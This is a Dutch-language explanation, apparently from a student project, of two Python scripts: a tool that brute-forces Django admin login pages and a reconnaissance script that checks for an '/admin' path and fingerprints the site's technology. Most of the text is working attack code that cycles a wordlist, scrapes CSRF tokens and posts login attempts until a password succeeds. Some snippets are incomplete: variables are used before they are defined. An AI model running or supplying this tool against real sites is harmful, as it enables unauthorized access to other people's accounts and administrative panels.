
BRUTEFORCE

het neemt eerst de argumenten uit de commandline. en probeerd de klasse bfloginpanel aan te spreken


if __name__ == '__main__':
    try:
        domain = sys.argv[1]
        username = sys.argv[2]
        password = sys.argv[3]
        BFLoginPanel(domain,username,password)
    except IndexError:
        print(f"Command Line: python {sys.argv[0]} domain username wordlist_file")


hierna vult hij de varabelen en de wordlist. de woorden lijst kan van het internet komen of locaal

 self.domain = domain
        self.username = username
        self.password = password
        self.cookies = {}
        self.session = requests.Session()
        self.url = domain + "/admin/login/?next=/admin"
        self.protocol_mode = "Local File Mode"

      if (self.protocol_mode == "Internet Mode"):
            try:
                self.wordlist = list(set(requests.get(password).text.split('\n')))
            except Exception as e:
                print("[-] Error:\n", e)
                exit()
        else:
            try:
                self.f = open(password, "r")
                self.wordlist = list(set([(word.strip()) for word in self.f.readlines()]))
                self.f.close()
            except Exception as e:
                print("[-] Error:\n", e)
                exit()

daarna spreekt het de funtie bruteforce aan

self.BruteForce()




hier word er een poging gemaakt om in te loggen via de wordlist. dit blijft gebeurten totdat er een correct passwoord is gevonden of dat het programma door de lijst is. deze resultaaten worden in de cli geprint.

def BruteForce(self):
        count = 0
        # Start Brute Force
        for self.password in self.wordlist:
            for key, value in self.session.cookies.items():
                self.cookies[key] = value
            self.soup = BeautifulSoup(self.login_page.text, 'html.parser')
            self.csrf_input = self.soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']

            url = self.domain + "/admin/login/?next=/admin"
            self.login_page = self.session.post(url, data={'csrfmiddlewaretoken': self.csrf_input,
                                                                'username': self.username,
                                                                'password': self.password}, cookies=self.cookies, headers=self.headers)
            if "CSRF" in self.login_page.text:
                print("[+] Error:\nCSRF token missing or incorrect.")
                exit()
            if "Please " not in self.login_page.text:
                print("[+] Found!: Username= " + self.username + " | Password= " + self.password + " - "+ str(self.login_page.status_code)+"\n\n")
                exit()
            else:
                count += 1
                print("(" + str(count) + ") Attempt: " + username + " - " + self.password + " - "+ str(self.login_page.status_code))





FINDPAGE
dit python script haalt de variablelen via de cli daarna stuurt het een request naar de /admin page om te zien dat deze bestaat. hierna voert het een check out om te zien met wat deze gebouwd is met de module builtwith.

import requests
import sys
import builtwith

# set url



url = "http://"+sys.argv[1]+"/admin"

def url_ok(site):
	# exception block
	try:
		# pass the url into
		# request.hear
		response = requests.head(site)
		# check the status code
		if response.status_code != 404:
			return True
		else:
			return False
	except requests.ConnectionError as e:
		return e

def admin(url):
        websitecheck1 = builtwith.parse(url)
        return(websitecheck1)

print(url)
if url_ok(url) == True:
    print("site bestaat, testing for /admin")  
    print(admin(url))
else:
    print("site bestaat niet")